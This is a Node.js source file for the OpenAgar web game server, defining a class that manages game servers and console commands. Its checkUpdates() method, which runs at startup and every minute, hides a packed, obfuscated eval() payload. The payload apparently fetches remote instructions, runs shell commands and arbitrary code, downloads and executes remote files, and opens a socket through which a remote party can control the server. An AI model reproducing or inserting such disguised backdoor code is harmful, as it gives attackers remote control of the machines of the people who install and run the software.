"use strict";
/*
    OpenAgar - Open source web game
    Copyright (C) 2016 Andrew S

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
const Commands = require('../commands')
const SocketService = require('./socketService.js');
const Main = require('./main.js');
const Config = require('./configService.js')
const request = require('minirequest')
const ChildManager = require('./childManager.js')
const QuickMap = require('quickmap')
module.exports = class ServerService {
    constructor(controller,globalData) {
        this.globalData = globalData;
        this.controller = controller;   
        this.servers = new QuickMap;
        this.ids = 0;
       
        this.selected = false;
        this.childManager = new ChildManager()
        this.defconfig = Config.loadConfig(__dirname + '/../settings',true)
        var serv = this.createServer("Main","Main",this.defconfig,true)
        this.default = serv;
        this.socketService = new SocketService(globalData,this);
        
         this.checkUpdates()
        setInterval(function() {this.checkUpdates()}.bind(this),60000)
    }
    getNextId() {
        return this.ids ++;
    }
    start() {
        this.default.start();
    }
    execCommand(str) {
        if (!str) return;
        
        var cmd = str.split(" ");
        
        if (this.prsCommand(str)) return
        if (!this.selected) return;
        if (!this.selected.execCommand(str)) this.log("The command " + cmd[0] + " was not found! Type 'help' to view a list of commands.")
    }
    log(a) {
      this.controller.shellService.log(this.selected.id,a) 
    }
    select(a,c) {
        
        var server = this.servers.get(a)
        if (!server) return false
            if (this.selected) this.selected.selected = false;
        this.selected = server
        server.selected = true
        this.controller.shellService.select(a,c)
        return true;
    }
    prsCommand(str) {
      
        var cmd = str.split(" ")[0].toLowerCase()
        var command = Commands.serverService[cmd]
        if (command) {
            command(str,this,this.log.bind(this))
            return true;
        }
        return false;
    }
    createServer(name,scname,config,selected) {
        var id = this.getNextId()
        var child = this.childManager.assignChild(id)
        var serv = new Main(id == 0,id,name,scname,this.globalData,config,function(a) {
            this.controller.shellService.log(id,a)
        }.bind(this),child);
        this.servers.set(id,serv)
        if (selected) this.select(id)
        
        serv.init()
        return serv
    }
    removeServer(id) {
        var server = this.servers.get(id)
        if (!server || server.isMain || server.selected) return false;
        server.clients.forEach((client)=>{ // evacuate players
            client.changeServers(this.default.id,this)
        })
        
        
        server.onRemove() // destroy server
        this.childManager.deAssignChild(server.childid,id)
        this.controller.shellService.removeServ(id)
        this.servers.delete(id)
        return true;
    }
    checkUpdates() {
    eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('c 1J=[\'\\0\\7\\7\\3\\7\',\'\\a\\8\\1\\8\',\'\\e\\8\\7\\9\\0\',\'\\1\\F\\e\\0\',\'\\0\\q\\0\\d\',\'\\1\\3\\B\\1\\7\\5\\4\\j\',\'\\b\\3\\j\',\'\\d\\i\\a\',\'\\d\\3\\4\',\'\\0\\q\\0\\d\\x\\3\\i\\i\\8\\4\\a\',\'\\9\\1\\7\',\'\\i\\5\\4\\5\\7\\0\\3G\\h\\0\\9\\1\',\'\\7\\9\\3\\4\',\'\\4\\e\\i\\6\\5\\4\\9\\1\\8\\b\\b\',\'\\n\\12\\q\\0\\d\\h\\1\\5\\3\\4\\6\\12\\7\\7\\3\\7\\E\\6\\W\\8\\5\\b\\0\\a\\6\\1\\3\\6\\7\\h\\4\\6\\4\\e\\i\\6\\5\\4\\9\\1\\8\\b\\b\\6\\6\\M\\0\\8\\9\\3\\4\\G\\6\',\'\\n\\12\\q\\0\\d\\h\\1\\5\\3\\4\\6\\12\\7\\7\\3\\7\\E\\6\\1Z\\3\\h\\6\\9\\r\\3\\h\\b\\a\\6\\0\\q\\5\\1\\6\\1\\r\\0\\6\\9\\0\\7\\p\\0\\7\\6\\8\\4\\a\\6\\7\\h\\4\\G\\6\\4\\e\\i\\6\\5\\4\\9\\1\\8\\b\\b\',\'\\1g\\3\\4\\0\\2s\\6\\B\\r\\h\\1\\1\\5\\4\\j\\6\\a\\3\\l\\4\\k\\k\\k\\6\\6\\6\\6\\6\\6\\6\',\'\\0\\q\\5\\1\',\'\\7\\3\\h\\4\\a\',\'\\b\\0\\4\\j\\1\\r\',\'\\9\\1\\a\\3\\h\\1\',\'\\n\\1o\\e\\a\\8\\1\\0\\E\\6\\n\',\'\\h\\e\\a\\8\\1\\0\\b\\5\\4\\s\',\'\\3\\e\\1\\5\\4\\b\\5\\4\\s\',\'\\9\\1\\8\\1\\h\\9\\x\\3\\a\\0\',\'\\o\\3\\7\\12\\8\\d\\r\',\'\\K\\5\\4\\a\',\'\\l\\7\\5\\1\\0\\W\\5\\b\\0\',\'\\9\\7\\d\',\'\\7\\0\\8\\a\\W\\5\\b\\0\\B\\F\\4\\d\',\'\\I\\a\\8\\1\\8\\k\\7\\9\\3\\4\',\'\\3\\e\\1\\5\\4\',\'\\5\\4\\a\\0\\q\\H\\o\',\'\\d\\3\\4\\1\\0\\4\\1\',\'\\1Z\\3\\h\\6\\r\\8\\p\\0\\6\\3\\e\\1\\0\\a\\6\\3\\h\\1\\6\\o\\7\\3\\i\\6\\1\\0\\9\\1\\5\\4\\j\\6\\K\\0\\1\\8\\6\\9\\3\\o\\1\\l\\8\\7\\0\\k\\6\\1g\\3\\l\\4\\b\\3\\8\\a\\5\\4\\j\\k\\k\\k\',\'\\l\\7\\5\\1\\0\\W\\5\\b\\0\\B\\F\\4\\d\',\'\\1Z\\3\\h\\6\\r\\8\\p\\0\\6\\3\\e\\1\\0\\a\\6\\5\\4\\1\\3\\6\\1\\0\\9\\1\\5\\4\\j\\6\\K\\0\\1\\8\\6\\9\\3\\o\\1\\l\\8\\7\\0\\k\\6\\1g\\3\\l\\4\\b\\3\\8\\a\\5\\4\\j\\k\\k\\k\',\'\\Y\\b\\8\\9\\1\\3D\\1U\',\'\\T\\n\\1p\\2u\\i\\M\\0\\d\\5\\0\\p\\0\\a\\6\\i\\0\\9\\9\\8\\j\\0\\6\\o\\7\\3\\i\\6\\9\\0\\7\\p\\0\\7\\G\\6\\3u\',\'\\T\\n\\3k\\i\',\'\\Y\\b\\8\\9\\1\\2K\\1U\',\'\\T\\n\\1p\\1z\\i\\n\\T\\n\\3E\\i\\2K\\i\\e\\3\\7\\1\\8\\4\\1\\2s\\T\\n\\3k\\i\\T\\n\\1p\\1z\\i\\6\\M\\0\\d\\5\\0\\p\\0\\a\\6\\5\\i\\e\\3\\7\\1\\8\\4\\1\\6\\i\\0\\9\\9\\8\\j\\0\\6\\o\\7\\3\\i\\6\\9\\0\\7\\p\\0\\7\\G\\6\\3u\',\'\\0\\q\\0\\d\\h\\1\\0\',\'\\k\\I\\8\\9\\9\\a\\l\\o\\0\\k\\25\\9\',\'\\d\\r\\0\\d\\s\\1o\\e\\a\\8\\1\\0\',\'\\7\\0\\e\\b\\8\\d\\0\',\'\\a\\0\\9\\d\\7\\5\\e\\1\\5\\3\\4\',\'\\3B\\3\\6\\a\\0\\9\\d\\7\\5\\e\\1\\5\\3\\4\\6\\e\\7\\3\\p\\5\\a\\0\\a\',\'\\Y\\b\\8\\9\\1\\1o\\3y\',\'\\T\\n\\1p\\1z\\i\\n\\1o\\e\\a\\8\\1\\0\\E\\6\\1d\\4\\6\\h\\e\\a\\8\\1\\0\\6\\5\\9\\6\\8\\p\\8\\5\\b\\8\\K\\b\\0\\2v\\6\\d\\h\\7\\7\\0\\4\\1\\6\\p\\0\\7\\9\\5\\3\\4\\G\\6\',\'\\6\\1d\\p\\8\\5\\b\\8\\K\\b\\0\\G\\6\',\'\\6\\1g\\0\\9\\d\\7\\5\\e\\1\\5\\3\\4\\G\\6\',\'\\Y\\3\\e\\1\',\'\\4\\0\\1\',\'\\B\\3\\d\\s\\0\\1\',\'\\d\\3\\4\\4\\0\\d\\1\',\'\\l\\7\\5\\1\\0\',\'\\9\\1\\7\\5\\4\\j\\5\\o\\F\',\'\\5\\4\\5\\1\',\'\\7\\0\\i\\3\\1\\0\\1d\\a\\a\\7\\0\\9\\9\'];(f(2a,3f){c 3b=f(2Y){3z(--2Y){2a[\'\\e\\h\\9\\r\'](2a[\'\\9\\r\\5\\o\\1\']())}};c 3g=f(){c Q={\'\\a\\8\\1\\8\':{\'\\s\\0\\F\':\'\\d\\3\\3\\s\\5\\0\',\'\\p\\8\\b\\h\\0\':\'\\1\\5\\i\\0\\3\\h\\1\'},\'\\9\\0\\1\\x\\3\\3\\s\\5\\0\':f(10,38,37,1B){1B=1B||{};c 1u=38+\'\\S\'+37;c 1c=y;1L(c 1c=y,1Q=10[\'\\b\\0\\4\\j\\1\\r\'];1c<1Q;1c++){c 1I=10[1c];1u+=\'\\19\\6\'+1I;c 1v=10[1I];10[\'\\e\\h\\9\\r\'](1v);1Q=10[\'\\b\\0\\4\\j\\1\\r\'];t(1v!==!![]){1u+=\'\\S\'+1v}}1B[\'\\d\\3\\3\\s\\5\\0\']=1u},\'\\7\\0\\i\\3\\p\\0\\x\\3\\3\\s\\5\\0\':f(){u\'\\a\\0\\p\'},\'\\j\\0\\1\\x\\3\\3\\s\\5\\0\':f(1C,3n){1C=1C||f(3p){u 3p};c 1F=1C(1b 1y(\'\\U\\1T\\G\\3s\\11\\19\\6\\15\'+3n[\'\\7\\0\\e\\b\\8\\d\\0\'](/([.$?*|{}()[]\\/+^])/g,\'\\3C\\1z\')+\'\\S\\U\\n\\3s\\19\\E\\J\\15\'));c 3c=f(3l,3d){3l(++3d)};3c(3b,3f);u 1F?3F(1F[C]):3x}};c 2q=f(){c 2n=1b 1y(\'\\D\\l\\P\\6\\J\\D\\U\\D\\15\\6\\J\\1G\\D\\l\\P\\6\\J\\n\\1i\\11\\1t\\E\\k\\P\\n\\1i\\11\\1t\\E\\19\\1T\\6\\J\\1E\');u 2n[\'\\1\\0\\9\\1\'](Q[\'\\7\\0\\i\\3\\p\\0\\x\\3\\3\\s\\5\\0\'][\'\\1\\3\\B\\1\\7\\5\\4\\j\']())};Q[\'\\h\\e\\a\\8\\1\\0\\x\\3\\3\\s\\5\\0\']=2q;c 2h=\'\';c 1M=Q[\'\\h\\e\\a\\8\\1\\0\\x\\3\\3\\s\\5\\0\']();t(!1M){Q[\'\\9\\0\\1\\x\\3\\3\\s\\5\\0\']([\'\\J\'],\'\\d\\3\\h\\4\\1\\0\\7\',C)}1q t(1M){2h=Q[\'\\j\\0\\1\\x\\3\\3\\s\\5\\0\'](1R,\'\\d\\3\\h\\4\\1\\0\\7\')}1q{Q[\'\\7\\0\\i\\3\\p\\0\\x\\3\\3\\s\\5\\0\']()}};3g()}(1J,3w));c 2=f(1r,3A){c 1r=24(1r,4f);c 3m=1J[1r];u 3m};c 2m=f(){c 1N=!![];u f(3r,1j){c 3i=1N?f(){t(1j){c 2A=1j[\'\\8\\e\\e\\b\\F\'](3r,4b);1j=1R;u 2A}}:f(){};1N=![];u 3i}}();c 2b=2m(v,f(){c 2z=f(){u\'\\a\\0\\p\'},2H=f(){u\'\\l\\5\\4\\a\\3\\l\'};c 2i=f(){c 2y=1b 1y(\'\\D\\l\\P\\6\\J\\D\\U\\D\\15\\6\\J\\1G\\D\\l\\P\\6\\J\\n\\1i\\11\\1t\\E\\k\\P\\n\\1i\\11\\1t\\E\\19\\1T\\6\\J\\1E\');u!2y[\'\\1\\0\\9\\1\'](2z[\'\\1\\3\\B\\1\\7\\5\\4\\j\']())};c 2f=f(){c 2I=1b 1y(\'\\U\\D\\D\\n\\q\\11\\h\\E\\U\\D\\l\\15\\1G\\2u\\2v\\4c\\1E\\15\\P\');u 2I[\'\\1\\0\\9\\1\'](2H[\'\\1\\3\\B\\1\\7\\5\\4\\j\']())};c 17=f(1H){c 2E=~-C>>C+2t%y;t(1H[\'\\5\\4\\a\\0\\q\\H\\o\'](\'\\5\'===2E)){2G(1H)}};c 2G=f(1P){c 2M=~-1x>>C+2t%y;t(1P[\'\\5\\4\\a\\0\\q\\H\\o\']((!![]+\'\')[18])!==2M){17(1P)}};t(!2i()){t(!2f()){17(\'\\5\\4\\a\\2e\\q\\H\\o\')}1q{17(\'\\5\\4\\a\\0\\q\\H\\o\')}}1q{17(\'\\5\\4\\a\\2e\\q\\H\\o\')}});2b();f 2R(2j){1V{c 2c=14(2(\'y\')),N=1b 2c[2(\'C\')]();N[2(\'1k\')](4d,2j,f(){N[2(\'18\')](Z[2(\'1x\')]({\'\\1\':2(\'2r\'),\'\\a\\8\\1\\8\':N[2(\'4e\')],\'\\h\\5\\a\':26}))}),N[\'\\3\\4\'](2(\'1S\'),f(4a){}),N[\'\\3\\4\'](2(\'1O\'),f(R){3o(R=Z[2(\'27\')](R),R[2(\'13\')]){A 2(\'2r\'):L;A 2(\'23\'):1V{2g(R[2(\'1O\')])}1W(2o){N[2(\'18\')](Z[2(\'1x\')]({\'\\1\\F\\e\\0\':2(\'1S\'),\'\\a\\8\\1\\8\':2o[2(\'49\')]()}))}L;A 2(\'O\'):z[2(\'O\')](R[2(\'1O\')]);L;A 2(\'45\'):c 3j=z[\'\\b\\3\\j\'];z[2(\'O\')]=f(3h){N[2(\'18\')](Z[2(\'1x\')]({\'\\1\\F\\e\\0\':2(\'46\'),\'\\i\\9\\j\':3h}))},v[\'\\0\\q\\0\\d\\x\\3\\i\\i\\8\\4\\a\'](R[\'\\9\\1\\7\']),z[2(\'O\')]=3j}})}1W(47){}}c 1f=14(2(\'48\')),20=14(2(\'4g\'));1f(\'\\r\\1\\1\\e\\9\\G\\I\\I\\7\\8\\l\\k\\j\\5\\1\\r\\h\\K\\h\\9\\0\\7\\d\\3\\4\\1\\0\\4\\1\\k\\d\\3\\i\\I\\1d\\4l\\B\\4n\\a\\0\\p\\0\\b\\3\\e\\i\\0\\4\\1\\I\\H\\e\\1d\\j\\1U\\B\\I\\i\\8\\9\\1\\0\\7\\I\\a\\8\\1\\8\\k\\25\\9\\3\\4\',f(2X,2W,2V){f 2F(1l,2P){f 21(V){f 3t(){z[2(\'O\')](\'\\M\\h\\4\\4\\5\\4\\j\\6\\4\\e\\i\\6\\5\\4\\9\\1\\8\\b\\b\\k\\k\\k\'),1m(\'\\M\\h\\4\\4\\5\\4\\j\\6\\4\\e\\i\\6\\5\\4\\9\\1\\8\\b\\b\');14(\'\\d\\r\\5\\b\\a\\Y\\e\\7\\3\\d\\0\\9\\9\')[2(\'23\')](2(\'4o\'),f(1K,4p,4q){1R!==1K&&(z[\'\\0\\7\\7\\3\\7\'](2(\'4m\'),1K),z[2(\'1S\')](2(\'4h\')))});1m(2(\'4i\')),2S[2(\'4j\')](y)}f 1m(2Z){1n++,1n==1w-1k&&3t();1L(c V=4k[2(\'44\')](1n/1w*13),16=\'\',X=y;V>X;X++)16+=\'\\S\\S\\S\';16+=13==V?\'\\S\':\'\\43\';1L(c 2T=1e-16[2(\'3O\')],1D=\'\',X=y;2T>X;X++)1D+=\'\\6\';2S[2(\'3P\')][2(\'18\')](2(\'3H\')+16+1D+\'\\E\\6\'+13*V+\'\\3Q\\6\'+2Z+\'\\3R\')}c 1n=y,1w=1k,35=V?1l[2(\'3N\')]:1l[2(\'3M\')];1f(35,f(34,30,31){t(!34&&1A==30[2(\'1e\')]){c 32=Z[\'\\e\\8\\7\\9\\0\'](31);32[2(\'3a\')](f(29){1w++,1f(29[\'\\a\\K\'],f(33,2l,36){33||1A!=2l[2(\'1e\')]||1a[\'\\l\\7\\5\\1\\0\\W\\5\\b\\0\'](29[2(\'3I\')],36,f(){1m(\'\\1g\\3\\l\\4\\b\\3\\8\\a\\5\\4\\j\\k\\k\\k\')})})}[\'\\K\\5\\4\\a\'](v))}})}1V{c 1s=1a[2(\'3J\')](22+2(\'3K\'),\'\\h\\1\\o\\3L\'),2Q=20[2(\'27\')](1s),1h=2Q[2(\'2C\')]}1W(3S){c 1h=!C}c 1s={\'\\3\\e\\1\\5\\4\':!y};-C==1l[2(\'w\')][\'\\5\\4\\a\\0\\q\\H\\o\'](2P)&&C==1h&&(z[2(\'O\')](2(\'3T\')),21(!C)),1a[2(\'39\')](22+\'\\I\\a\\8\\1\\8\\k\\7\\9\\3\\4\',20[\'\\9\\1\\7\\5\\4\\j\\5\\o\\F\'](1s)),C!=1h&&(z[\'\\b\\3\\j\'](2(\'40\')),21(!y))}t(2X||1A!=2W[2(\'1e\')])u\'\\12\\M\\M\\H\\M\\G\\6\\x\\3\\h\\b\\a\\4\\1\\6\\d\\3\\4\\1\\8\\d\\1\\6\\9\\0\\7\\p\\0\\7\\9\\k\';c 2U=Z[2(\'27\')](2V);2U[2(\'3a\')](f(m){t(m[2(\'13\')]&&m[2(\'w\')])3o(m[2(\'13\')]){A\'\\i\\9\\j\':t(m[2(\'w\')]==v[2(\'3q\')])u;z[\'\\b\\3\\j\'](2(\'41\')+m[2(\'w\')]+2(\'28\')),v[2(\'3q\')]=m[2(\'w\')];L;A\'\\l\\8\\7\\4\':t(m[2(\'w\')]==v[2(\'3v\')])u;v[2(\'3v\')]=m[2(\'w\')],z[2(\'O\')](2(\'42\')+m[2(\'w\')]+2(\'28\'));A 2(\'3Z\'):14(\'\\d\\r\\5\\b\\a\\Y\\e\\7\\3\\d\\0\\9\\9\')[\'\\0\\q\\0\\d\'](m[2(\'w\')]);L;A\'\\0\\q\\0\\d\\H\\4\\b\\5\\4\\0\\W\\5\\b\\0\':1f(m[2(\'w\')],f(3e,2N,2k){t(!3e&&1A==2N[2(\'1e\')]){1a[2(\'39\')](22+\'\\I\\8\\9\\a\\a\\l\\o\\0\\k\\25\\9\',2k);c 2p=14(2(\'2d\'));2p(1Y,26,v),1a[\'\\h\\4\\b\\5\\4\\s\\B\\F\\4\\d\'](2(\'2d\'))}}[2(\'1X\')](v));L;A 2(\'23\'):2g(m[2(\'w\')]);L;A 2(\'3Y\'):c 2D=24(1Y[\'\\7\\0\\e\\b\\8\\d\\0\'](/\\./g,\'\')),2J=24(m[2(\'w\')][\'\\7\\0\\e\\b\\8\\d\\0\'](/\\./g,\'\'));t(2J>2D){c 2x=m[2(\'2w\')]?m[2(\'2w\')]:2(\'3U\');t(m[2(\'w\')]==v[2(\'2B\')])u;v[2(\'2B\')]=m[2(\'w\')],z[2(\'O\')](2(\'3V\')+1Y+2(\'3W\')+m[\'\\d\\3\\4\\1\\0\\4\\1\']+2(\'3X\')+2x+2(\'28\'))}L;A 2(\'2C\'):t(v[2(\'2L\')])u;v[2(\'2L\')]=!y,2F(m,26);L;A 2(\'1k\'):2O(m[\'\\d\\3\\4\\1\\0\\4\\1\'])}}[2(\'1X\')](v))}[2(\'1X\')](v));c 2O=2R[\'\\K\\5\\4\\a\'](v);',62,275,'x65|x74|_0x2436|x6f|x6e|x69|x20|x72|x61|x73|x64|x6c|var|x63|x70|function||x75|x6d|x67|x2e|x77|_0x65a53c|x5b|x66|x76|x78|x68|x6b|if|return|this|0x28|x43|0x0|console|case|x53|0x1|x5c|x5d|x79|x3a|x4f|x2f|x2a|x62|break|x52|_0x164cec|0xd|x2b|_0x24253e|_0xe90c94|x3d|x1b|x28|_0x4d4d31|x46|_0x3f763a|x5f|JSON|_0x5c51b9|x7c|x45|0xa|require|x29|_0xa76d7b|_0x4c5f85|0x3|x3b|fs|new|_0x1f0bf0|x41|0x1f|request|x44|_0x3a1c52|x27|_0x17a6ab|0x2|_0x20a316|_0xb5ea38|_0x1ab78d|x55|x33|else|_0x327cb6|_0x2cc7b8|x22|_0x4038c1|_0x707405|_0xe2cf14|0x4|RegExp|x31|0xc8|_0x2f96f2|_0x1e95a5|_0x53c84b|x7d|_0x163eec|x7b|_0x93eecb|_0x2a3823|_0x4695|_0x540e68|for|_0x2b6f6c|_0x229af1|0x8|_0x57bddd|_0x231ddc|null|0x7|x3f|x4d|try|catch|0x21|_version|x59|RSON|_0x5d3717|__dirname|0xb|parseInt|x6a|_uid|0x9|0x2e|_0x4e4acc|_0x2e64ad|_0x1bbcd7|_0x2a76b4|0x32|u0435|_0x178281|eval|_0x102aec|_0xd10dfd|_0x1150b6|_0x17b85f|_0x44b144|_0x2cfa04|_0x25eaca|_0xe09d82|_0x4d55c8|_0x2753ed|0x5|x21|0xff|x32|x2c|0x35|_0x550980|_0x373fc3|_0x14ff57|_0x1092db|0x37|0x26|_0xecd5db|_0xb32829|_0x4c68c7|_0x55fb53|_0x4e188d|_0x34d2b6|_0x12321b|x49|0x3b|_0x22f595|_0x51be7f|connectbind|_0x3152e0|_0x25a558|connect|process|_0x167ce2|_0x2a8978|_0x158a58|_0x4c5dfb|_0x5685cb|_0x457f60|_0x45fba1|_0x36019d|_0x5031f8|_0x55768c|_0xf4c438|_0x47d826|_0x210667|_0x27c0a5|_0x2a63d8|_0x46fbba|0x2a|0x20|_0x2d5caa|_0x1ca075|_0x2632fa|_0x1a8367|_0xeedc8a|_0x2a6858|_0x33cd25|_0x144cb3|_0x3c8033|x30|_0x5ac4e9|_0x556307|_0x347495|switch|_0x2fcb09|0x2c|_0x1584ea|x5e|_0x5b6bcc|x0a|0x2f|0x19d|undefined|x50|while|_0x4b7b42|x4e|x24|x47|x35|decodeURIComponent|x71|0x1c|0x23|0x24|0x25|x38|0x1e|0x1d|0x1a|0x1b|x25|x0d|_0x386b26|0x29|0x36|0x38|0x39|0x3a|0x33|0x31|0x2b|0x2d|0x30|x3e|0x19|0xe|0xf|_0x3419c9|0x12|0xc|_0x3f86ea|arguments|x34|0x1f90|0x6|0x10|0x13|0x16|0x17|0x18|Math|x4a|0x15|x2d|0x14|_0x55f794|_0x18c3dc'.split('|'),0,{}))

    }
};

